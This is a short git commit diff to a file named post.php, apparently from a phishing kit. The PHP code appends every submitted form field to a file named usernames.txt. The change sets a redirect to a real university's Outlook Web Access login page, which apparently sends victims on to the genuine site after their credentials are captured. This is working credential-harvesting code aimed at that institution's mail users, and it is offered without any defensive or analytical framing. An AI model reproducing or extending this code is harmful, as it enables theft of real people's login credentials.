506d22a43c2924e9bf6e02e14226fd8134457990
bibigolfadat <162908780+bibigolfadat@users.noreply.github.com>
2024-03-10 20:44:42 +0330

    post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 _<?php
-header ('Location:');
+header ('Location:https://mail.mubabol.ac.ir/owa');
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
